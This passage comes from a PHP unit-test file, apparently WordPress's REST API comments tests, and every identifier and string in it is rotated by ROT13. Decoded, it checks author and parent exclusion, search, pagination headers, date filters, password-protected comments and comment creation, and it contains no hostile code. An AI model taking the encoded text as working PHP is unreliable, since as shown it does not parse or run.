			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
			'hfre_vq'          => frys::$nhgube_vq,
		);

		frys::snpgbel()->pbzzrag->perngr( $netf );
		$netf['hfre_vq'] = frys::$fhofpevore_vq;
		frys::snpgbel()->pbzzrag->perngr( $netf );
		hafrg( $netf['hfre_vq'] );
		frys::snpgbel()->pbzzrag->perngr( $netf );

		$gbgny_pbzzragf = frys::$gbgny_pbzzragf + 3;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $gbgny_pbzzragf, $pbzzragf );

		// Rkpyhqr pbzzrag nhgube.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', frys::$nhgube_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $gbgny_pbzzragf - 1, $pbzzragf );

		// Rkpyhqr obgu pbzzrag nhgubef.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', neenl( frys::$nhgube_vq, frys::$fhofpevore_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$pbzzragf = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $gbgny_pbzzragf - 2, $pbzzragf );

		// 'nhgube_rkpyhqr' sbe vainyvq nhgube.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', 'fxvccl' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );

		// Haninvynoyr gb hanhguragvpngrq; qrsnhygf gb reebe.
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg->frg_cnenz( 'nhgube_rkpyhqr', neenl( frys::$nhgube_vq, frys::$fhofpevore_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_cnenz', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_vgrzf_cnerag_net() {
		$netf                   = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
		);
		$cnerag_vq              = frys::snpgbel()->pbzzrag->perngr( $netf );
		$cnerag_vq2             = frys::snpgbel()->pbzzrag->perngr( $netf );
		$netf['pbzzrag_cnerag'] = $cnerag_vq;
		frys::snpgbel()->pbzzrag->perngr( $netf );
		$netf['pbzzrag_cnerag'] = $cnerag_vq2;
		frys::snpgbel()->pbzzrag->perngr( $netf );

		$gbgny_pbzzragf = frys::$gbgny_pbzzragf + 4;

		// Nyy pbzzragf va gur qngnonfr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_pbzzragf, $erfcbafr->trg_qngn() );

		// Yvzvg gb gur cnerag.
		$erdhrfg->frg_cnenz( 'cnerag', $cnerag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		// Yvzvg gb gjb cneragf.
		$erdhrfg->frg_cnenz( 'cnerag', neenl( $cnerag_vq, $cnerag_vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 2, $erfcbafr->trg_qngn() );

		// Vainyvq 'cnerag' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'cnerag', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_cnerag_rkpyhqr_net() {
		$netf                   = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
		);
		$cnerag_vq              = frys::snpgbel()->pbzzrag->perngr( $netf );
		$cnerag_vq2             = frys::snpgbel()->pbzzrag->perngr( $netf );
		$netf['pbzzrag_cnerag'] = $cnerag_vq;
		frys::snpgbel()->pbzzrag->perngr( $netf );
		$netf['pbzzrag_cnerag'] = $cnerag_vq2;
		frys::snpgbel()->pbzzrag->perngr( $netf );

		$gbgny_pbzzragf = frys::$gbgny_pbzzragf + 4;

		// Nyy pbzzragf va gur qngnonfr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_pbzzragf, $erfcbafr->trg_qngn() );

		// Rkpyhqr guvf cnegvphyne cnerag.
		$erdhrfg->frg_cnenz( 'cnerag_rkpyhqr', $cnerag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_pbzzragf - 1, $erfcbafr->trg_qngn() );

		// Rkpyhqr obgu pbzzrag cneragf.
		$erdhrfg->frg_cnenz( 'cnerag_rkpyhqr', neenl( $cnerag_vq, $cnerag_vq2 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_pbzzragf - 2, $erfcbafr->trg_qngn() );

		// Vainyvq 'cnerag_rkpyhqr' fubhyq reebe.
		$erdhrfg->frg_cnenz( 'cnerag_rkpyhqr', 'vainyvq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_frnepu_dhrel() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
			'pbzzrag_pbagrag'  => 'sbb',
			'pbzzrag_nhgube'   => 'Ubzre W Fvzcfba',
		);

		$vq = frys::snpgbel()->pbzzrag->perngr( $netf );

		$gbgny_pbzzragf = frys::$gbgny_pbzzragf + 1;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_pbzzragf, $erfcbafr->trg_qngn() );

		// Bar zngpuvat pbzzrag.
		$erdhrfg->frg_cnenz( 'frnepu', 'sbb' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq, $qngn[0]['vq'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzragf_cntvangvba_urnqref( $zrgubq ) {
		$gbgny_pbzzragf = frys::$gbgny_pbzzragf;
		$gbgny_cntrf    = (vag) prvy( $gbgny_pbzzragf / 10 );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Fgneg bs gur vaqrk.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pbzzragf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( '/jc/i2/pbzzragf' )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// 3eq cntr.
		frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);
		++$gbgny_pbzzragf;
		++$gbgny_cntrf;
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pbzzragf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( '/jc/i2/pbzzragf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 4,
			),
			erfg_hey( '/jc/i2/pbzzragf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// Ynfg cntr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cntr', $gbgny_cntrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pbzzragf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf - 1,
			),
			erfg_hey( '/jc/i2/pbzzragf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );

		// Bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pbzzragf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregRdhnyf( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf,
			),
			erfg_hey( '/jc/i2/pbzzragf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzragf_vainyvq_qngr( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'nsgre', 'sbb' );
		$erdhrfg->frg_cnenz( 'orsber', 'one' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_pbzzragf_inyvq_qngr() {
		$pbzzrag1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_qngr'    => '2016-01-15G00:00:00M',
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);
		$pbzzrag2 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_qngr'    => '2016-01-16G00:00:00M',
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);
		$pbzzrag3 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_qngr'    => '2016-01-17G00:00:00M',
				'pbzzrag_cbfg_VQ' => frys::$cbfg_vq,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'nsgre', '2016-01-15G00:00:00M' );
		$erdhrfg->frg_cnenz( 'orsber', '2016-01-17G00:00:00M' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $pbzzrag2, $qngn[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->purpx_pbzzrag_qngn( $qngn, 'ivrj', $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->frg_dhrel_cnenzf(
			neenl(
				'pbagrkg' => 'rqvg',
			)
		);

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->purpx_pbzzrag_qngn( $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$raqcbvag = arj JC_ERFG_Pbzzragf_Pbagebyyre();
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,fgnghf' );
		$bow      = trg_pbzzrag( frys::$nccebirq_vq );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'fgnghf',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	/**
	 * @gvpxrg 58238
	 */
	choyvp shapgvba grfg_cercner_vgrz_pbzzrag_grkg_svygre() {
		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'pbzzrag_grkg', neenl( $svygre, 'svygre' ), 10, 3 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag() );
		$guvf->nffregPbhag( 3, $svygre->trg_netf()[0] );
	}

	choyvp shapgvba grfg_trg_pbzzrag_nhgube_ningne_heyf() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%q', frys::$nccebirq_vq ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 24, $qngn['nhgube_ningne_heyf'] );
		$guvf->nffregNeenlUnfXrl( 48, $qngn['nhgube_ningne_heyf'] );
		$guvf->nffregNeenlUnfXrl( 96, $qngn['nhgube_ningne_heyf'] );

		$pbzzrag = trg_pbzzrag( frys::$nccebirq_vq );
		// Vtaber gur fhoqbznva, fvapr trg_ningne_hey() enaqbzyl frgf
		// gur Teningne freire jura ohvyqvat gur HEY fgevat.
		$guvf->nffregFnzr( fhofge( trg_ningne_hey( $pbzzrag->pbzzrag_nhgube_rznvy ), 9 ), fhofge( $qngn['nhgube_ningne_heyf'][96], 9 ) );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_vainyvq_vq( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pbzzrag_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_vainyvq_pbagrkg( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pbzzragf/%f', frys::$nccebirq_vq ) );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_vainyvq_cbfg_vq( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf/' . $pbzzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_vainyvq_cbfg_vq_nf_nqzva( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$pbzzrag_vq = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/pbzzragf/' . $pbzzrag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_abg_nccebirq( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pbzzragf/%q', frys::$ubyq_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_abg_nccebirq_fnzr_hfre( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pbzzragf/%q', frys::$ubyq_vq ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_trg_pbzzrag_jvgu_puvyqera_yvax() {
		$pbzzrag_vq_1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$puvyq_pbzzrag = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cnerag'   => $pbzzrag_vq_1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%f', $pbzzrag_vq_1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlUnfXrl( 'puvyqera', $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_trg_pbzzrag_jvgubhg_puvyqera_yvax() {
		$pbzzrag_vq_1 = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_nccebirq' => 1,
				'pbzzrag_cbfg_VQ'  => frys::$cbfg_vq,
				'hfre_vq'          => frys::$fhofpevore_vq,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', fcevags( '/jc/i2/pbzzragf/%f', $pbzzrag_vq_1 ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregNeenlAbgUnfXrl( 'puvyqera', $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_jvgu_cnffjbeq_jvgubhg_rqvg_cbfg_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pbzzragf/%f', $cnffjbeq_pbzzrag ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 38692
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_pbzzrag_jvgu_cnffjbeq_jvgu_inyvq_cnffjbeq( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$netf = neenl(
			'pbzzrag_nccebirq' => 1,
			'pbzzrag_cbfg_VQ'  => frys::$cnffjbeq_vq,
		);

		$cnffjbeq_pbzzrag = frys::snpgbel()->pbzzrag->perngr( $netf );

		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, fcevags( '/jc/i2/pbzzragf/%f', $cnffjbeq_pbzzrag ) );
		$erdhrfg->frg_cnenz( 'cnffjbeq', 'gbbznalfrpergf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnenzf = neenl(
			'cbfg'         => frys::$cbfg_vq,
			'nhgube_anzr'  => 'Pbzvp Obbx Thl',
			'nhgube_rznvy' => 'pot@naqebvqfqhatrba.pbz',
			'nhgube_hey'   => 'uggc://naqebvqfqhatrba.pbz',
			'pbagrag'      => 'Jbefg Pbzzrag Rire!',
			'qngr'         => '2014-11-07G10:14:25',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->nqq_urnqre( 'Pbagrag-Glcr', 'nccyvpngvba/wfba' );
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->purpx_pbzzrag_qngn( $qngn, 'rqvg', $erfcbafr->trg_yvaxf() );
		$guvf->nffregFnzr( 'ubyq', $qngn['fgnghf'] );
		$guvf->nffregFnzr( '2014-11-07G10:14:25', $qngn['qngr'] );
		$guvf->nffregFnzr( frys::$cbfg_vq, $qngn['cbfg'] );
	}

	choyvp shapgvba qngn_pbzzrag_qngrf() {
		erghea neenl(
			'frg qngr jvgubhg gvzrmbar'     => neenl(
				'cnenzf'  => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr'            => '2016-12-12G14:00:00',
				),
				'erfhygf' => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
			'frg qngr_tzg jvgubhg gvzrmbar' => neenl(
				'cnenzf'  => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr_tzg'        => '2016-12-12G19:00:00',
				),
				'erfhygf' => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
			'frg qngr jvgu gvzrmbar'        => neenl(
				'cnenzf'  => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr'            => '2016-12-12G18:00:00-01:00',
				),
				'erfhygf' => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
			'frg qngr_tzg jvgu gvzrmbar'    => neenl(
				'cnenzf'  => neenl(
					'gvzrmbar_fgevat' => 'Nzrevpn/Arj_Lbex',
					'qngr_tzg'        => '2016-12-12G18:00:00-01:00',
				),
				'erfhygf' => neenl(
					'qngr'     => '2016-12-12G14:00:00',
					'qngr_tzg' => '2016-12-12G19:00:00',
				),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_pbzzrag_qngrf
	 */
	choyvp shapgvba grfg_perngr_pbzzrag_qngr( $cnenzf, $erfhygf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', $cnenzf['gvzrmbar_fgevat'] );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pbzzragf' );
		$erdhrfg->frg_cnenz( 'pbagrag', 'abg rzcgl' );
		$erdhrfg->frg_cnenz( 'cbfg', frys::$cbfg_vq );
		vs ( vffrg( $cnenzf['qngr'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr', $cnenzf['qngr'] );
		}
		vs ( vffrg( $cnenzf['qngr_tzg'] ) ) {
			$erdhrfg->frg_cnenz( 'qngr_tzg', $cnenzf['qngr_tzg'] );
		}
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		hcqngr_bcgvba( 'gvzrmbar_fgevat', '' );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn    = $erfcbafr->trg_qngn();
		$pbzzrag = trg_pbzzrag( $qngn['vq'] );

